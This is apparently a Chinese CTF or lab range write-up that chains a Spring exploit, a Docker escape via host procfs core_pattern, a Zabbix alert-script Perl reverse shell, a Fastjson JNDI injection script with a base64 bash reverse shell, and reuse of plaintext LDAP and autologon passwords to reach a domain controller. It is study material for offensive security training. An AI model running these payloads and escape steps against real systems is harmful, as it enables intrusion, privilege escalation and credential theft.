# 信息收集

常规tcp udp扫描

```bash
┌──(root㉿MJ)-[/tmp/test/ccb]
└─# nmap --min-rate 10000 -p1-65535 39.101.77.113
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-31 12:58 CST
Warning: 39.101.77.113 giving up on port because retransmission cap hit (10).
Nmap scan report for 39.101.77.113
Host is up (0.19s latency).
Not shown: 58988 closed tcp ports (reset), 6544 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 51.57 seconds


┌──(root㉿MJ)-[/tmp/test/ccb]
└─# nmap -sU --top-ports 20 39.101.77.113
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-31 12:58 CST
Nmap scan report for 39.101.77.113
Host is up (0.22s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   closed        ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   open|filtered microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown

Nmap done: 1 IP address (1 host up) scanned in 39.09 seconds
```

仅此而已了，fscan可以接着来个poc检测，不过这个8080端口非常不稳，而且由于回显比较慢，导致挺多工具会判超时


# Web

<img width="2012" height="1259" alt="Image" src="https://github.com/user-attachments/assets/1d1f218b-7850-495b-907d-74082d79ed8a" />

Spring无疑了，扫出来洞直接打内存马，哥斯拉连一下

<img width="1503" height="847" alt="Image" src="https://github.com/user-attachments/assets/9f2316af-77c8-4224-86a0-69eaa8a791ff" />

<img width="896" height="622" alt="Image" src="https://github.com/user-attachments/assets/6b33248d-9d00-4903-bde2-67726e1f2185" />

# docker逃逸
```sh

/ >id

uid=0(root) gid=0(root) groups=0(root)
/ >ls -al /

total 31308
drwxr-xr-x   1 root root     4096 Sep  2 07:20 .
drwxr-xr-x   1 root root     4096 Sep  2 07:20 ..
-rwxr-xr-x   1 root root        0 Sep  2 07:20 .dockerenv
drwxr-xr-x   1 root root     4096 May 12  2021 bin
drwxr-xr-x   2 root root     4096 Mar 19  2021 boot
drwxr-xr-x   5 root root      360 Dec 31 04:56 dev
drwxr-xr-x   1 root root     4096 Sep  2 07:20 etc
drwxr-xr-x   2 root root     4096 Mar 19  2021 home
drwxr-xr-x   3 root root     4096 Sep  2 07:20 host
drwxr-xr-x   1 root root     4096 May 12  2021 lib
drwxr-xr-x   2 root root     4096 May 11  2021 lib64
drwxr-xr-x   2 root root     4096 May 11  2021 media
drwxr-xr-x   2 root root     4096 May 11  2021 mnt
drwxr-xr-x   2 root root     4096 May 11  2021 opt
dr-xr-xr-x 178 root root        0 Dec 31 04:56 proc
drwx------   1 root root     4096 May 12  2021 root
drwxr-xr-x   3 root root     4096 May 11  2021 run
drwxr-xr-x   2 root root     4096 May 11  2021 sbin
-rw-r--r--   1 root root 31976758 Mar  2  2022 spring-cloud-gateway-0.0.1-SNAPSHOT.jar
drwxr-xr-x   2 root root     4096 May 11  2021 srv
dr-xr-xr-x  13 root root        0 Dec 31 04:56 sys
drwxrwxrwt   1 root root     4096 Dec 31 04:56 tmp
drwxr-xr-x   1 root root     4096 May 11  2021 usr
drwxr-xr-x   1 root root     4096 May 11  2021 var
/ >
```

进来就是root不过很容易发现是个docker，而且是非特权

```sh
/ >cat /proc/1/status | grep -i "seccomp"

Seccomp:	2
Seccomp_filters:	1
/ >
```

这里看的是这篇文章[docker逃逸方式总结分享-先知社区](https://xz.aliyun.com/news/17111)，不过cdk直接嗦也是可以的，不过就是单纯的限制了上传文件的大小，得分挺多小块传上去的，这里手动逃逸了

## Procfs危险挂载

linux中的`/proc`目录是一个伪文件系统，其中动态反应着系统内进程以及其他组件的状态。  
如果 docker 启动时将 /proc 目录挂载到了容器内部，就可以实现逃逸。

前置知识：  
`/proc/sys/kernel/core_pattern`文件是负责 进程崩溃时 的内存数据转储，当第一个字符是管道符`|`时，后面的部分会以命令行的方式进行解析并运行。并且由于容器共享主机内核的原因，这个命令是以宿主机的权限运行的。  
利用该解析方式，可以进行容器逃逸。

### 1 
判断 是否挂载了宿主机的 procfs，执行下面的命令，如果找到两个 `core_pattern` 文件那可能就是挂载了宿主机的 procfs

```sh
/ >find / -name core_pattern

/proc/sys/kernel/core_pattern
/host/proc/sys/kernel/core_pattern
```
第一个是容器本身的 procfs，第二个是挂载的宿主机的 procfs


### 2
找到当前容器在宿主机下的绝对路径

```sh
/ >cat /proc/mounts | xargs -d ',' -n 1 | grep workdir

workdir=/var/lib/docker/overlay2/0158e7b92583381e25557d75696c90d5984f79e2abcf336a060e3b1f4c21982a/work 0 0
/ >
```
**workdir** 是分层存储的工作目录，而**merged** 是挂载点（即容器的文件系统视图）将路径中的 `work` 替换为 `merged` 就是当前容器在宿主机上面的绝对路径

所以挂载在宿主机的绝对路径就是

```sh
/var/lib/docker/overlay2/0158e7b92583381e25557d75696c90d5984f79e2abcf336a060e3b1f4c21982a/merged
```

### 3
写入恶意配置文件，然后使docker崩溃，从而执行恶意脚本，我采取写入公钥，同时必须为exp.sh加执行权限

```bash
cat >/tmp/exp.sh << EOF
#!/bin/bash
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbVBGO0cO3rPhnRBL1sy+Vl/M84FYJfGWkI5C8aLRNywiz99hQvhC90JoxdaMx3WNOykizvZu5eji7+rJcDRFsNni7AFgzV3YN0VNAlWjrIq8/2N/nxWlj/qVeF8xjMNdIU18XSCyB12++szs0rQM/gq1sQ7o6Drn1D1d7fDlUHREpliaKyhpzMl8dd5oQDs5EhJxZv+5OQSwhGQxPDCotjjahrowhsxhFxOwcnqJhXIFK2LkmHpmQa6QP4csO13zebkFEfAshoIr2capsKjwlue6Nbe7tC3vUq7ltzFSCO8Tal4823dEV90QMndlDCz1psuBTCGIB3lP2o9pdSp2L' > /root/.ssh/authorized_keys
EOF
```

原文采取
```bash
echo -e "|/var/lib/docker/overlay2/a7a150eaaad31da1134fda2cb314fb3268e3e47aac8f9775c6c42743c0653ffa/merged/tmp/exp.py \rcore " > /test2/proc/sys/kernel/core_pattern
```
方法，但是由于哥斯拉内存马拿到的shell是sh环境会导致双引号解析错误，如果使用单引号会导致'-e'字符串被写入到core_pattern中，所以这里采用print

```sh
printf '|/var/lib/docker/overlay2/0158e7b92583381e25557d75696c90d5984f79e2abcf336a060e3b1f4c21982a/merged/tmp/exp.sh \rcore ' > /host/proc/sys/kernel/core_pattern
```

接着让docker出错就行了

```bash
cat >/tmp/exp.c << EOF
#include <stdio.h>
int main(void)
{
    int *a = NULL;
    *a = 1;
    return 0;
}
EOF
```

因为glibc不一样，其他机器编译的拉到靶机可能没法运行，所以采用musl-libc静态编译，然后上传靶机执行

```bash
musl-gcc -o exp exp.c -static

/root >./exp

Segmentation fault
/root >
```
到此公钥文件被写入，私钥连接即可

## flag1

根下可以拿第一个flag

```bash
root@platform:~# cat /flag
flag{2d7f940b-6371-4b9a-bc14-62fa9a579cfb}
```
# 内网


靶机不出网，正向vshell上线即可

```bash
┌──(root㉿MJ)-[/tmp/test/ccb]
└─# scp tcp_linux_amd64 root@39.101.77.113:/root/
root@39.101.77.113's password:
tcp_linux_amd64  

root@platform:~# ./tcp_linux_amd64 &
[1] 2577
```

fscan扫一下，有用信息如下

```text
(icmp) Target 172.16.22.14    is alive
(icmp) Target 172.16.22.41    is alive
(icmp) Target 172.16.22.88    is alive
[*] Icmp alive hosts len is: 5
172.16.22.88:8080 open
172.16.22.88:80 open
172.16.22.88:22 open
172.16.22.41:445 open
172.16.22.41:139 open
172.16.22.41:135 open
172.16.22.41:88 open
172.16.22.14:80 open
172.16.22.14:22 open
[*] alive ports len is: 12
start vulscan
[*] WebTitle http://172.16.22.14       code:200 len:10671  title:Apache2 Ubuntu Default Page: It works
[*] WebTitle http://172.16.22.88       code:200 len:4531   title:政务内网资源下载
[*] NetInfo
[*]172.16.22.41
   [->]DC
   [->]172.16.22.41
[*] NetBios 172.16.22.41    [+] DC:ZWFW\DC
[*] WebTitle http://172.16.22.88:8080  code:404 len:306    title:None
```

## 172.16.22.14

只开放了80和22，80是个apache的默认页面，做目录扫描可以发现存在zabbix

```bash
┌──(root㉿MJ)-[/tmp/test/ccb]
└─# pc dirsearch -u http://172.16.22.14/
[13:35:25] 200 -    1KB - /zabbix/
```

默认密码Admin/zabbix

告警里面改下脚本命令反弹shell即可

```bash
perl -e 'use Socket;$i="172.16.22.12";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```
同样没新的内网段了，那这个就到此为止了


## flag2

```bash
zabbix@zabbix:/$ find / -perm -4000 2>/dev/null
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/ss
/usr/bin/su
/usr/bin/at
/usr/bin/mount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
zabbix@zabbix:/$ ss -a -F /flag.txt
Error: an inet prefix is expected rather than "flag{a48837f5-a716-410b-85af-6fb0ab4ed56e}".
Cannot parse dst/src address.
zabbix@zabbix:/$
```


## 172.16.22.88

开放22，80，8080端口

访问80可以下载个apk包，wget下来转jar分析，不会逆向参考wp写的，不够能搜到的wp对不熟悉相关知识的真实太不友好

fastjson参考[Fastjson反序列化漏洞深度解析与利用和修复-先知社区](https://xz.aliyun.com/news/15984)
jndi注入参考[用marshalsec & Jndi注入利用工具（JNDI-Injection-Exploit）复现Fastjson反序列化漏洞--保姆级！复现过程！-CSDN博客](https://blog.csdn.net/2301_79837041/article/details/137647502)

<img width="2542" height="1231" alt="Image" src="https://github.com/user-attachments/assets/3baef434-b9b9-4be3-a318-1aadea5c6585" />


<img width="2559" height="1071" alt="Image" src="https://github.com/user-attachments/assets/6f9ea00a-f76f-427e-ac07-ab93abb05db5" />

可以看到版本1.2.24和key，这个版本没有做任何过滤，这里不解释原因了，因为我也不会，只能说交给逆向手或者大牛子了


内网主机开rmi服务反弹shell
```bash
root@platform:~/test# java -jar jdni-inject.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuMjIuMTIvMjMzMSAwPiYx}|{base64,-d}|{bash,-i}" -A "172.16.22.12"
[ADDRESS] >> 172.16.22.12
[COMMAND] >> bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuMjIuMTIvMjMzMSAwPiYx}|{base64,-d}|{bash,-i}
----------------------------JNDI Links----------------------------
Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
rmi://172.16.22.12:1099/zeeje2
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://172.16.22.12:1099/opnefm
ldap://172.16.22.12:1389/opnefm
Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
rmi://172.16.22.12:1099/daedal
ldap://172.16.22.12:1389/daedal

----------------------------Server Log----------------------------
2025-12-31 16:00:56 [JETTYSERVER]>> Listening on 0.0.0.0:8180
2025-12-31 16:00:56 [RMISERVER]  >> Listening on 0.0.0.0:1099
2025-12-31 16:00:56 [LDAPSERVER] >> Listening on 0.0.0.0:1389
2025-12-31 16:13:07 [RMISERVER]  >> Have connection from /172.16.22.88:34710
2025-12-31 16:13:13 [RMISERVER]  >> Reading message...
2025-12-31 16:13:13 [RMISERVER]  >> Is RMI.lookup call for zeeje2 2
2025-12-31 16:13:13 [RMISERVER]  >> Sending local classloading reference.
2025-12-31 16:13:13 [RMISERVER]  >> Closing connection
```

另起shell开监听

```bash
root@platform:~# nc -lvnp 2331
Listening on 0.0.0.0 2331
```



### 脚本
```python
import base64
import os
import json
import requests
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend


# ===== 配置信息 =====
SERVER_URL = "http://172.16.22.88:8080/api/login"
PUBLIC_KEY_B64 = (
    "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnKum2FOeaPQumhLBpRauv+OMB6pkdqAC"
    "jbZYkzzP8CZgjwEwmKauXLxzur1beldNDlVnUs83CnnvanPIYW3oP56t0SoqDmWviBTBJ2aCjtrz"
    "tFYjBixZEYJ2Exp9f6cdFuSMiucPyuhwY8AuFWnGPJ3Mwt8L8ouV9Lc6Ptp67fCZ0aHr1BVu+pXv"
    "HVktbcmeCt+61dnyd9iXTDZfIQ9rwrDsTlkEYORN0hckpFWvgaoNXhXm60ioLkk/qtPZSjir0bpD"
    "L0w0iZ3+wRJLtUOe3KyGx+C00S5w2cM0Zw1XlmRQ08yj1nObVkaVsfEU8sSk/XFVnuCrO9YfQCa1"
    "uxm5ZQIDAQAB"
)


def main():
    # ===== 1. 要发送的 JSON 明文 =====
    plaintext = """{
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "rmi://172.16.22.12:1099/zeeje2",
        "autoCommit": true
    }"""

    print("待加密的 JSON 数据:")
    print(plaintext)
    print("-" * 50)

    # ===== 2. 生成随机 AES 密钥 (128-bit) =====
    aes_key = os.urandom(16)
    print(f"生成的 AES 密钥长度: {len(aes_key)} 字节")

    # ===== 3. AES/GCM 加密 =====
    iv = os.urandom(12)  # 12 字节初始化向量
    print(f"生成的 IV 长度: {len(iv)} 字节")

    encryptor = Cipher(
        algorithms.AES(aes_key),
        modes.GCM(iv),
        backend=default_backend()
    ).encryptor()

    ciphertext = encryptor.update(plaintext.encode("utf-8"))
    ciphertext += encryptor.finalize()
    tag = encryptor.tag

    print(f"加密后的密文长度: {len(ciphertext)} 字节")
    print(f"GCM 认证标签长度: {len(tag)} 字节")

    # 构建请求体: IV + 密文 + GCM 标签
    request_body = iv + ciphertext + tag
    request_body_b64 = base64.b64encode(request_body).decode("utf-8")
    print(f"Base64 编码后的请求体长度: {len(request_body_b64)} 字符")

    # ===== 4. 使用 RSA 公钥加密 AES 密钥 =====
    public_key_bytes = base64.b64decode(PUBLIC_KEY_B64)
    public_key = serialization.load_der_public_key(
        public_key_bytes,
        backend=default_backend()
    )

    encrypted_aes_key = public_key.encrypt(
        aes_key,
        padding.PKCS1v15()
    )

    encrypted_key_b64 = base64.b64encode(encrypted_aes_key).decode("utf-8")
    print(f"RSA 加密后的 AES 密钥长度: {len(encrypted_aes_key)} 字节")
    print(f"Base64 编码后的加密密钥: {encrypted_key_b64[:50]}...")

    # ===== 5. 构建请求头并发送 POST 请求 =====
    headers = {
        "Content-Type": "application/octet-stream",
        "X-Encrypted-Key": encrypted_key_b64,
    }

    print("-" * 50)
    print("正在发送请求...")
    print(f"目标地址: {SERVER_URL}")
    print(f"请求头: {headers}")

    try:
        response = requests.post(
            SERVER_URL,
            data=request_body_b64.encode("utf-8"),
            headers=headers,
            timeout=10
        )

        print("-" * 50)
        print(f"响应状态码: {response.status_code}")
        print(f"响应内容: {response.text}")

    except requests.exceptions.Timeout:
        print("请求超时")
    except requests.exceptions.ConnectionError:
        print("连接错误，请检查网络或服务器地址")
    except Exception as e:
        print(f"请求发生异常: {str(e)}")


if __name__ == "__main__":
    main()
```

发包接shell

```bash
┌──(.venv)─(root㉿MJ)-[/tmp/test/ccb]
└─# pc python3 ez.py
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
待加密的 JSON 数据:
{
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "rmi://172.16.22.12:1099/zeeje2",
        "autoCommit": true
    }
--------------------------------------------------
生成的 AES 密钥长度: 16 字节
生成的 IV 长度: 12 字节
加密后的密文长度: 144 字节
GCM 认证标签长度: 16 字节
Base64 编码后的请求体长度: 232 字符
RSA 加密后的 AES 密钥长度: 256 字节
Base64 编码后的加密密钥: HGg+xAo8KgrsBxxLqNkGVSgmAN+Cq6e4m68KAI10soWo8XLcTC...
--------------------------------------------------
正在发送请求...
目标地址: http://172.16.22.88:8080/api/login
请求头: {'Content-Type': 'application/octet-stream', 'X-Encrypted-Key': 'HGg+xAo8KgrsBxxLqNkGVSgmAN+Cq6e4m68KAI10soWo8XLcTC3rLOHXwAzgvrq8QGB97Bxm8FpK5qxlTvoRSeb4PMStJOQWEMdY8TfrrUSco2ZwjSTF6tE9W8RX3AMZVqC6luGlwGl5NUdopkZUBS2ta0UGWY53HHthjMedbpT4bdCTUP4sJeTEwuPu5f5+WeqNILAk8RncWfbeeX4h7T3FN+XqkPIjHS7wsAAbdeUlF/F/twMlVJgzvtwePuwjUDD5fY0c412QEMtdGoNUdZ8NLK6uuqDWCoZ5ImajhQumuX1res8fDlAkEPxyeuO04s2+/baIKEq7pAJvw+yf/g=='}
--------------------------------------------------
响应状态码: 400
响应内容: Decrypted data is not valid JSON or empty
```


## flag3

```bash
root@AppServer:/# cat /flag
cat /flag
flag{5814d11a-d4b2-866e-28ab-c788e3a063b2}
```



## 172.16.22.41

这个说是域渗透其实感觉涉及的知识不多，而且很基础
这台是DC，在172.16.22.14其实还可以发现域用户ldapadmin

<img width="1666" height="612" alt="Image" src="https://github.com/user-attachments/assets/a4dfddcb-80eb-4346-bfb0-63b0e510e4fa" />

zabbix的数据库连接信息存在`/etc/zabbix/zabbix_server.conf`中
域用户信息存在userdirectory_ldap表中，不过是没权限读的，s位的ss也只能读第一行

```bash
zabbix@zabbix:/tmp$ ls -al /etc/zabbix/zabbix_server.conf
-rw------- 1 root root 31264 Sep  3 13:47 /etc/zabbix/zabbix_server.conf
```

不过这里是弱密码

```bash
zabbix@zabbix:/tmp$ mysql -uzabbix -ppassword

mysql> select * from userdirectory_ldap \G;
*************************** 1. row ***************************
 userdirectoryid: 1
            host: 172.16.22.41
            port: 389
         base_dn: OU=Zabbix,DC=zwfw,DC=com
search_attribute: sAMAccountName
         bind_dn: CN=ldapadmin,OU=Zabbix,DC=zwfw,DC=com
   bind_password: XpVLGkQHm8
       start_tls: 0
   search_filter:
    group_basedn:
      group_name: cn
    group_member:
   user_ref_attr:
    group_filter:
group_membership: memberOf
   user_username:
   user_lastname:
1 row in set (0.00 sec)
```

```bash
┌──(root㉿MJ)-[/tmp/test/ccb]
└─# pc evil-winrm -i 172.16.22.41 -u ldapadmin -p XpVLGkQHm8
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ldapadmin\Documents> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DisableBackButton    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    EnableSIHostIntegration    REG_DWORD    0x1
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x36aa8b5e
    ShutdownFlags    REG_DWORD    0x7
    AutoLogonSID    REG_SZ    S-1-5-21-623508419-3032997920-3505136064-500
    LastUsedUsername    REG_SZ    Administrator
    DisableLockWorkstation    REG_DWORD    0x0
    DefaultDomainName    REG_SZ    ZWFW
    DefaultUserName    REG_SZ    administrator
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    a4Z6FcRYSp6LLSGO
```

这里特意设置了自动登录，密码明文就直接存着，administrator直接登就行


## flag4

```bash
┌──(root㉿MJ)-[/tmp/test/ccb]
└─# pc evil-winrm -i 172.16.22.41 -u administrator -p a4Z6FcRYSp6LLSGO
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/flag.txt
flag{5af3b42d-ce27-4a6f-9037-29d81346310a}
```





